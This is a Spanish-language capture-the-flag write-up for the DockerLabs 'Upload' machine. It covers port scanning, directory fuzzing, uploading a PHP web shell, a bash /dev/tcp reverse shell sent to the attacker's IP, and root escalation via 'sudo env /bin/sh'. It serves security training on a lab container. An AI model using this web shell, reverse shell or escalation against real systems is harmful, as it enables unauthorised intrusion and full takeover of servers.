# Máquina Upload

## Reconocimiento
Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver qué puertos tiene abiertos.
Este escaneo realiza un escaneo de todos los puertos disponibles en el host "172.17.0.2", mostrando solo los
puertos abiertos, utilizando el escaneo de tipo TCP SYN ("-sT"), estableciendo una velocidad mínima de envío de paquetes de 5000 por segundo ("--min-rate 5000"), activando el modo de verbosidad extremadamente alto ("-vvv"), desactivando la resolución DNS ("-n"), no realizando el ping previo al escaneo ("-Pn"), y guardando los resultados en formato Greppable en un archivo llamado "allPorts" ("-oG allPorts").

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________

PORT    STATE SERVICE REASON
80/tcp  open  http  syn-ack
```
Vemos que tan solo tiene el **puerto 80 abierto**, es decir, el servicio http, donde estará corriendo una página web que inspeccionaremos en unos instantes.
Lanzamos un conjunto de scripts con el parámetro "-sCV" ("-sC" y "-sV" combinados) para que nos reporte más información.
El comando utiliza el script de versión y detección de servicio, enfocándose únicamente en el puerto 80 ("-p80") del host "172.17.0.2", y guarda los resultados en un archivo de texto plano llamado "targeted" ("-oN targeted").

```shell
nmap -sCV -p80 172.17.0.2 -oN targeted
________________________________________________

PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Upload here your file
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

--------------------

Vemos el título, la versión de Apache, y poca información más. Accedemos a la web para ver ante qué nos enfrentamos.

![image](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/c4132f21-6c6e-4cd9-ac27-ea530c72a24a)

Encontramos un campo de **subida de archivos**. Esto, sumado al nombre de la máquina, nos deja claro que tendremos que abusar de una subida de archivos para intentar ganar acceso a la máquina.
Probamos a subir un archivo txt de prueba:

![image](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/73401c36-dd46-4904-91ea-9f9786574e75)

## Fuzzing

Nos indica que se ha subido correctamente. Ahora vamos a tratar de ubicarlo en algún directorio realizando **fuzzing** para descubrir posibles directorios. Para ello usaremos la herramienta **gobuster** y un diccionario de directorios comunes:

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
________________________________________________

/icons/               (Status: 403) [Size: 275]
/uploads/             (Status: 200) [Size: 741]
/server-status/       (Status: 403) [Size: 275]
```

Encontramos un **directorio uploads**.
Accedemos a él y encontramos el archivo que hemos subido:

![image](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/af16d052-d909-494b-b31e-7d7dc274e296)

También comprobamos que lo podemos abrir y leer sin problemas:

![image](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/732d4fff-fbf9-4155-92a2-86cd325f70a2)

Como ya tenemos una ruta donde ubicar los archivos que subimos, vamos a tratar de subir un archivo con código **php malicioso**. Si lo logramos y este es interpretado por la máquina, podremos llegar a ejecutar comandos en la máquina que corre el servicio web, lo que se conoce como **RCE** -> (Remote Code Execution)

## Explotación

Creamos un archivo llamado **cmd.php**
En este incluimos incluiremos el siguiente contenido:

```php
<?php
	system($_GET['cmd']);
?>
```

**GET** es un método de solicitud utilizado en HTTP para enviar datos a un servidor web. Cuando se usa en una URL, como en ?cmd=valor, indica que se está pasando un parámetro llamado cmd con un valor específico. En el
contexto de este código PHP, captura el valor del parámetro cmd pasado en la URL y lo utiliza como un comando para ejecutar en el sistema.

Observamos que la hemos subido correctamente:

![image](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/697a6d79-ff64-4d1e-bc2f-d6d8350c774f)

Nos dirigimos como antes al directorio **/uploads** donde lo deberíamos encontrar:

![image](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/4fbb15fa-c9a7-4540-9801-22ea4a3de3be)

Observamos que nos está interpretando el php, ya que no aparece el texto que hemos incluido en nuestro cmd.php
Confirmamos que es vulnerable y procedemos a ejecutar un comando.

```
http://172.17.0.2/uploads/cmd.php?cmd=id
```

![image](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/efd2655f-22ad-44b4-92b3-d8157d349460)

En este caso, al acceder a la URL http://172.17.0.2/uploads/cmd.php?cmd=id, estamos utilizando el método GET para enviar un parámetro llamado cmd con el valor id.

El código PHP en el archivo cmd.php  ejecuta el comando del sistema que se pasa como valor de cmd. Por lo tanto, el servidor ejecuta el comando id, que muestra la identificación del
usuario y los grupos a los que pertenece en el sistema operativo.

El siguiente paso, una vez hemos comprobado que tenemos ejecución remota de comandos sobre la máquina, es ejecutar un comando que nos envíe una consola interactiva a nuestra máquina atacante. A esto se le conoce como **Reverse Shell**.
Para ello, nos ponemos en escucha previamente en nuestra máquina atacante, por ejemplo con **netcat**:

```shell
nc -nlvp 443
```

(Es posible que en tu máquina sea necesario **root** para escuchar por el puerto 443)

A continuación, ejecutamos la reverse shell a través de la url como anteriormente el comando id. Le pasaremos el siguiente valor al parámetro cmd:

```shell
http://172.17.0.2/uploads/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.39/443 0>%261" 
```
Los caracteres "**&**" los url-encodearemos para que no nos den problemas (corresponden al **%26**), y la IP en la reverse shell es la correspondiente a nuestra máquina atacante.

Tras ejecutarlo, comprobamos que **hemos ganado acceso a la máquina**.

![image](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/cc007fd1-4766-4a3a-a950-2040f9c3fcb2)

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:

```shell
script /dev/null -c bash 
```
(hacemos  **ctrl  +  Z**)

```shell
stty raw -echo; fg
reset xterm
stty rows 62 columns 248
export TERM=xterm
export SHELL=bash
```

Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina.
Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.

## Escalada de privilegios

Una de las primeras comprobaciones que se realiza al ganar acceso a una máquina es ejecutar el comando "**sudo -l**" para listar los permisos de sudo que tiene el usuario actual en el sistema. Muestra qué comandos específicos el usuario puede ejecutar con privilegios elevados utilizando sudo, así como cualquier restricción aplicada a esos comandos.

```shell
sudo -l
```

![image](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/79be4197-1435-47f5-8812-09ed665d2002)

En este caso observamos que podemos ejecutar el binario "**/usr/bin/env**" como el usuario **root**, sin proporcionar contraseña.

Si no sabemos como explotarlo, podemos recurrir a [GTFOBins](https://gtfobins.github.io/) , y si es crítico esta página nos indicará como podemos explotarlo. En este caso es sencillo ya que con env podemos lanzarnos directamente una consola, y al poder ejecutarlo como root, esta consola será lanzada con sus permisos, de forma que hemos logrado el nivel de privilegios máximo sobre la máquina !

```shell
sudo env /bin/sh
whoami
________________________________________________
root
```






